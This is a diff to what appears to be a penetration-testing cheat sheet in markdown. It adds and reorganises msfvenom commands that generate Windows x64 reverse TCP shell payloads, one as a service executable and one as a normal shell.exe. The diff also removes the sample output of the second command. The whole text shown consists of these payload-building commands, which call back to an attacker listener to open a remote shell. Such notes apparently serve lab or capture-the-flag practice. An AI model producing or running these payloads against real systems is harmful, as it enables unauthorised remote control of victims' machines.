@@ -1,14 +1,15 @@
 
+## Creating Service .exe payload
+
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o shell.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 460 bytes
-Final size of exe file: 7680 bytes
-Saved as: shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=5555 -f exe-service 
 ```
 
+## Creating normal .exe payload
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o shell.exe
+```
 ##### Encoded Shellcode (x86)
 
 ```
